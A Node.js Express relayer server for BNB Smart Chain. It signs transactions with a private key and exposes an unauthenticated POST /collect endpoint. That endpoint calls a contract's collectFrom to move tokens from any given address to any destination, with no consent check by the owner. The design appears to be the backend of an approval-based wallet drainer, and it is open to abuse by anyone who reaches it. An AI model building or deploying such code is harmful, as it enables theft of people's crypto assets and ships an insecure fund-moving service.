require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();

/* =========================
   MIDDLEWARE
========================= */
app.use(cors()); // ✅ IMPORTANT (fix Failed to fetch)
app.use(express.json());

/* =========================
   BSC RPC
========================= */
const provider = new ethers.JsonRpcProvider(
  "https://bsc-dataseed.binance.org/"
);

/* =========================
   RELAYER WALLET
========================= */
if (!process.env.PRIVATE_KEY) {
  throw new Error("PRIVATE_KEY missing in ENV");
}

const wallet = new ethers.Wallet(
  process.env.PRIVATE_KEY,
  provider
);

/* =========================
   COLLECTOR CONTRACT
========================= */
if (!process.env.COLLECTOR_CONTRACT) {
  throw new Error("COLLECTOR_CONTRACT missing in ENV");
}

const COLLECTOR_CONTRACT =
  process.env.COLLECTOR_CONTRACT;

/* ABI */
const ABI = [
  "function collectFrom(address token,address from,uint256 amount,address to) external"
];

const collector = new ethers.Contract(
  COLLECTOR_CONTRACT,
  ABI,
  wallet
);

/* =========================
   STATUS ROUTE
========================= */
app.get("/", (req, res) => {
  res.json({
    status: true,
    relayer: wallet.address,
    contract: COLLECTOR_CONTRACT
  });
});

/* =========================
   RELAYER ENDPOINT
========================= */
app.post("/collect", async (req, res) => {
  try {
    const { token, from, to, amount } = req.body;

    if (!token || !from || !to || !amount) {
      return res.status(400).json({
        success: false,
        error: "Missing params"
      });
    }

    console.log("Collect request:", req.body);

    /* SEND TX */
    const tx = await collector.collectFrom(
      token,
      from,
      amount,
      to
    );

    console.log("TX SENT:", tx.hash);

    const receipt = await tx.wait();

    console.log("CONFIRMED:", receipt.hash);

    res.json({
      success: true,
      hash: tx.hash
    });

  } catch (err) {
    console.error("ERROR:", err);

    res.status(500).json({
      success: false,
      error: err.reason || err.message
    });
  }
});

/* =========================
   START SERVER
========================= */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("✅ Relayer running on port", PORT);
});
